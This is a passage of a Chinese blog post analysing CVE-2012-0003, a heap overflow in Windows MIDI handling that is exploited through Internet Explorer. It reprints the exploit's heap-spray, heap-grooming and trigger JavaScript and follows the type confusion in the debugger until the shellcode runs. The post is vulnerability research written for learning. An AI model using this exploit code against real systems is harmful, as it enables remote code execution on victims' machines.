class="line">heap_obj.gc();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">600</span>; i++) &#123;</span><br><span class="line">  heap_obj.alloc(block);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第二部分：漏洞利用的关键部分</span></span><br><span class="line">&lt;script language=<span class="string">'javascript'</span>&gt;</span><br><span class="line"><span class="keyword">var</span> heap = <span class="keyword">new</span> heapLib.ie();</span><br><span class="line"><span class="keyword">var</span> selob = <span class="built_in">document</span>.createElement(<span class="string">"select"</span>)</span><br><span class="line">selob.w0 = <span class="built_in">unescape</span>(<span class="string">"%u0c0c%u0c0c"</span>)</span><br><span class="line">selob.w1 = alert</span><br><span class="line">...</span><br><span class="line">selob.w55 = alert</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> clones = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">feng_shui</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (i &lt; <span class="number">1000</span>) &#123;</span><br><span class="line">    clones[i] = selob.cloneNode(<span class="literal">true</span>)</span><br><span class="line">    i = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (j &lt; <span class="number">1000</span>) &#123;</span><br><span class="line">    <span class="keyword">delete</span> clones[j];</span><br><span class="line">    CollectGarbage();</span><br><span class="line">    j  = j + <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">feng_shui();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> k = <span class="number">999</span>;</span><br><span class="line">  <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span>(clones[k].w0) == <span class="string">"string"</span>) &#123;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      clones[k].w0(<span class="string">'come on!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    k = k - <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  feng_shui();</span><br><span class="line">  <span class="built_in">document</span>.audio.Play();</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第三部分：调用trigger函数，也是关键</span></span><br><span class="line">&lt;script <span class="keyword">for</span>=audio event=PlayStateChange(oldState,newState)&gt;</span><br><span class="line">  <span class="keyword">if</span> (oldState == <span class="number">3</span> &amp;&amp; newState == <span class="number">0</span>) &#123;</span><br><span class="line">    trigger();</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>第二段js代码分析：</p>
<ol>
<li>创建一个 select 元素，并设置 56 个属性：只有 w0 为 String 类型，其余为 Object 类型；</li>
<li>创建一个1000大小的数组 clones</li>
<li>调用feng_shui函数：cloneNode 循环复制selob到数组 clones 中、间隔地释放 clones 数组中的元素</li>
</ol>
</li>
<li><p>每个属性类型的定义，在内存均用不同的数值表示，比如 0x09 代表 Object,0x08 代表 String</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081035.jpg" alt="image-20200124141010461"></p>
</li>
<li><p>找到分配空间与释放空间的地方，以便设置条件记录断点</p>
<p> 分配：CAttrArray::Clone函数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080648.jpg" alt="image-20200124124541997"></p>
<p> 释放：CImplAry::Delete函数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081037.jpg" alt="image-20200124125008678"></p>
</li>
<li><p><strong>漏洞利用思想：1000个元素的数组，经过间隔释放后，会留有许多间隙，当目标程序在处理音轨事件时，会调用winmmAlloc函数来申请堆空间（如上漏洞成因所言），新申请的堆空间会“插空“，刚好占在被释放的元素位置上，这样其左右两侧均是数组元素，若对此堆空间进行操作，使之产生溢出，则会影响两侧的数据，进而控制程序实施恶意操作。</strong></p>
</li>
<li><p>找到申请堆空间的地方，以便获取堆空间地址，如下eax作为函数返回值便是。</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081030.jpg" alt="image-20200124120452736"></p>
</li>
<li><p>在数组元素分配、释放以及堆空间申请的地方设置条件记录断点，来验证漏洞利用思想是否正确，除此之外，在崩溃点也设置断点（一般断点），以便进行下一步的调试（为避免程序被异常中断，先关闭页堆机制）</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 条件记录断点</span></span><br><span class="line"><span class="number">0x76B2CDEE</span>: 记录eax: 堆空间地址;</span><br><span class="line"><span class="number">0x7E38E80D</span>: 记录[eax+<span class="number">4</span>]; 数组元素分配地址</span><br><span class="line"><span class="number">0x7E279860</span>: 记录[esi+<span class="number">4</span>]; 数组元素释放地址</span><br></pre></td></tr></table></figure>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-80655.jpg" alt="image-20200124134030679"></p>
</li>
<li><p>alt+T查看日志消息，如上所言，新申请的堆空间实现了“插空“（占在刚释放的数组元素上），地址为0x02B174F0</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">地址       消息</span><br><span class="line">...</span><br><span class="line"><span class="number">7E38</span>E80D   COND: Array Alloc = <span class="number">02B</span>174F0</span><br><span class="line">...</span><br><span class="line"><span class="number">7E279860</span>   COND: Array Free = <span class="number">02B</span>174F0</span><br><span class="line">...</span><br><span class="line"><span class="number">76B</span>2CDEE   COND: VulBuffer Alloc = <span class="number">02B</span>174F0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>到达崩溃点时，esi指向0x08，即w0属性String</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080701.jpg" alt="image-20200124141230272"></p>
</li>
<li><p>后续在处理NoteOn事件时，会将读取的字节+1并重新写入，0x08+1 = 0x09，由string类型变为Object类型，此时其字符串”0x0c0c0c0c”也会作为指针/地址解析（典型的堆喷射地址）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080640.jpg" alt="image-20200124141520627"></p>
</li>
<li><p>第三段js代码分析</p>
<ol>
<li>调用trigger函数</li>
<li>遍历数组元素，若其属性不是String（即Object），则执行<code>clones[k].w0(&#39;come on!&#39;);</code></li>
<li>此语句会调用 CAttrValue::GetIntoVariant 函数</li>
</ol>
</li>
<li><p>属性非String时，会调用CAttrValue::GetIntoVariant 函数，此函数会获取虚表指针、调用虚函数，从而控制程序执行流程</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-81038.jpg" alt="image-20200124143956292"></p>
</li>
<li><p>执行到“获取虚表指针”指令处，虚表指针正是w0的字符串“0x0c0c0c0c”，此时其作为指针解析（堆喷射地址）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080700.jpg" alt="image-20200124144402834"></p>
</li>
<li><p>接下来调用虚函数，call地址为0c0c0c0c，进入布置好的堆空间，经过滑块指令到达shellcode，成功执行，漏洞利用成功！</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-81035.jpg" alt="image-20200124144711946"></p>
</li>
</ol>
<h1 id="07-参考文献"><a href="#07-参考文献" class="headerlink" title="07-参考文献"></a>07-参考文献</h1><ul>
<li>《漏洞战争》</li>
</ul>
<p>（祝大家新年快乐、身体健康，希望肺炎疫情赶紧过去！</p>
<p>首发于看雪论坛：<a href="https://bbs.pediy.com/thread-257371.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257371.htm</a></p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>21Guns
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://21guns.top/2020/01/24/reverse/cve-2012-0003漏洞分析（堆溢出）/" title="cve-2012-0003漏洞分析（堆溢出）">http://21guns.top/2020/01/24/reverse/cve-2012-0003漏洞分析（堆溢出）/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/01/11/reverse/cve-2010-2883漏洞分析（栈溢出）/" rel="prev" title="cve-2010-2883漏洞分析（栈溢出）">
      <i class="fa fa-chevron-left"></i> cve-2010-2883漏洞分析（栈溢出）
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/02/19/reverse/cve-2013-2551漏洞分析（整数溢出）/" rel="next" title="cve-2013-2551漏洞分析（整数溢出）">
      cve-2013-2551漏洞分析（整数溢出） <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#01-漏洞描述"><span class="nav-number">1.</span> <span class="nav-text">01-漏洞描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#02-测试环境"><span class="nav-number">2.</span> <span class="nav-text">02-测试环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#03-漏洞复现"><span class="nav-number">3.</span> <span class="nav-text">03-漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#04-准备工作"><span class="nav-number">4.</span> <span class="nav-text">04-准备工作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-提取样本"><span class="nav-number">4.1.</span> <span class="nav-text">4.1-提取样本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-MIDI格式"><span class="nav-number">4.2.</span> <span class="nav-text">4.2-MIDI格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-3-堆调试技巧"><span class="nav-number">4.3.</span> <span class="nav-text">4.3-堆调试技巧</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#05-漏洞成因"><span class="nav-number">5.</span> <span class="nav-text">05-漏洞成因</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#06-漏洞利用"><span class="nav-number">6.</span> <span class="nav-text">06-漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#07-参考文献"><span class="nav-number">7.</span> <span class="nav-text">07-参考文献</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="21Guns" src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">21Guns</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">164</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">71</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="vx:lxllxllx1" title="Wechat → vx:lxllxllx1" rel="noopener" target="_blank"><i class="fab fa-weixin fa-fw"></i>Wechat</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://github.com/21Gun5" title="GitHub → https://github.com/21Gun5" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">21Guns</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/pisces.js"></script>
<script src="/js/next-boot.js"></script>



  




  <script src="/js/local-search.js"></script>












  

  

</body>
</html>
